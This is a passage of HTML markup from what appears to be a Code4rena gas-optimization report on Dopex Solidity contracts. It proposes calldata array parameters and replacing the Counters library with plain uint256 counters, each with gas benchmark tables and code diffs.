data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">315</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">settle</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">316:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">optionIds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">317</span><span class=\"mtk1\">:  )</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @inheritdoc      IPerpetualAtlanticVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function settle(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256[] memory optionIds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256[] calldata optionIds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   )</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L405-L407\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L405-L407</a></p>\n<h3 id=\"use-calldata-for-strikes-save-233-gas-on-average\" style=\"position:relative;\"><a href=\"#use-calldata-for-strikes-save-233-gas-on-average\" aria-label=\"use calldata for strikes save 233 gas on average permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use calldata for <code>strikes</code> (Save 233 Gas on average)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>64779</td>\n<td>99013</td>\n<td>101124</td>\n<td>154379</td>\n</tr>\n<tr>\n<td>After</td>\n<td>64485</td>\n<td>98780</td>\n<td>100909</td>\n<td>154085</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">perp</span><span class=\"mtk1\">-</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PerpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">405</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateFunding</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">406:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">strikes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">407</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingAmount</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function calculateFunding(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256[] memory strikes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256[] calldata strikes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) external nonReentrant returns (uint256 fundingAmount) {</span></span></span></code></pre>\n<h2 id=\"g-06-use-uint256-instead-of-the-counter-library\" style=\"position:relative;\"><a href=\"#g-06-use-uint256-instead-of-the-counter-library\" aria-label=\"g 06 use uint256 instead of the counter library permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Use uint256 instead of the counter library</h2>\n<p>The counters version runs 6 more instructions than the uint version  due to the counters code needing to jump into the Counters library.\nThe 6 added instructions are: 2 JUMPs, 2 JUMPDESTs, and 2 PUSH1s. These are used to jump from the current executing code to the library function that actually handles the increment logic. The total gas costs of these operations is 24 units\nIn addition to using more gas, using the Counters library also results in a larger deployment size\nSee <a href=\"https://twitter.com/0xCygaar/status/1608562486508417025\">More Info</a></p>\n<p><strong>Note:The counters library is also being deprecated</strong><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/pull/4289\">https://github.com/OpenZeppelin/openzeppelin-contracts/pull/4289</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Bond.sol#L9\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Bond.sol#L9</a></p>\n<h3 id=\"rdpxv2bondsolmint-get-rid-of-counters-save-109-gas\" style=\"position:relative;\"><a href=\"#rdpxv2bondsolmint-get-rid-of-counters-save-109-gas\" aria-label=\"rdpxv2bondsolmint get rid of counters save 109 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RdpxV2Bond.sol.mint(): get rid of counters (Save 109 Gas)</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>105847</td>\n<td>113510</td>\n<td>115747</td>\n<td>117747</td>\n</tr>\n<tr>\n<td>After</td>\n<td>105738</td>\n<td>113401</td>\n<td>115638</td>\n<td>117638</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">:</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/utils/Counters.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Counter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Counter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Bond.sol#L37-L43\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Bond.sol#L37-L43</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxV2Bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">38:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTER_ROLE</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">current</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increment</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"130\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-import { Counters } from &quot;@openzeppelin/contracts/utils/Counters.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract RdpxV2Bond is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ERC721,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -15,9 +14,8 @@ contract RdpxV2Bond is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   AccessControl,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ERC721Burnable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  using Counters for Counters.Counter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  Counters.Counter private _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  uint256 private _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   bytes32 public constant MINTER_ROLE = keccak256(&quot;MINTER_ROLE&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -37,8 +35,10 @@ contract RdpxV2Bond is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function mint(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) public onlyRole(MINTER_ROLE) returns (uint256 tokenId) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    tokenId = _tokenIdCounter.current();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _tokenIdCounter.increment();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    tokenId = _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    unchecked{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      ++_tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _mint(to, tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p><strong>Similar Instance</strong></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/decaying-bonds/RdpxDecayingBonds.sol#L13\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/decaying-bonds/RdpxDecayingBonds.sol#L13</a></p>\n<h3 id=\"rdpxdecayingbondssolminttoken--save-162-gas\" style=\"position:relative;\"><a href=\"#rdpxdecayingbondssolminttoken--save-162-gas\" aria-label=\"rdpxdecayingbondssolminttoken  save 162 gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RdpxDecayingBonds.sol.mintToken() : save 162 Gas</h3>\n<p>**Benchmarks based on function <code>mint()</code> which calls the function <code>mintToken()</code></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Min</th>\n<th>Average</th>\n<th>Median</th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>184661</td>\n<td>192194</td>\n<td>195461</td>\n<td>197461</td>\n</tr>\n<tr>\n<td>After</td>\n<td>184529</td>\n<td>192062</td>\n<td>195329</td>\n<td>197329</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">decaying</span><span class=\"mtk1\">-</span><span class=\"mtk12\">bonds</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">:</span><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/utils/Counters.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">26</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Counter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">Counters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Counter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:  </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_symbol</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increment</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/decaying-bonds/RdpxDecayingBonds.sol#L129-L133\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/decaying-bonds/RdpxDecayingBonds.sol#L129-L133</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">decaying</span><span class=\"mtk1\">-</span><span class=\"mtk12\">bonds</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_mintToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">current</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_tokenIdCounter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increment</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"133\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-import { Counters } from &quot;@openzeppelin/contracts/utils/Counters.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> // Interfaces</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { IERC20WithBurn } from &quot;../interfaces/IERC20WithBurn.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -23,9 +22,8 @@ contract RdpxDecayingBonds is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   AccessControl</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   using SafeERC20 for IERC20WithBurn;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  using Counters for Counters.Counter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  Counters.Counter private _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  uint256 private _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   // Create a new role identifier for the minter role</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   bytes32 public constant MINTER_ROLE = keccak256(&quot;MINTER_ROLE&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -60,7 +58,9 @@ contract RdpxDecayingBonds is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // Grant the minter role and admin role to deployer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _setupRole(MINTER_ROLE, msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _tokenIdCounter.increment();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      ++_tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /*============ ADMIN FUNCTIONS ============*/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -127,8 +127,10 @@ contract RdpxDecayingBonds is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @dev Internal function to mint a bond position token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   /// @param to the address to mint the position to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function _mintToken(address to) private returns (uint256 tokenId) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    tokenId = _tokenIdCounter.current();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _tokenIdCounter.increment();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    tokenId = _tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    unchecked{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      ++_tokenIdCounter;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span 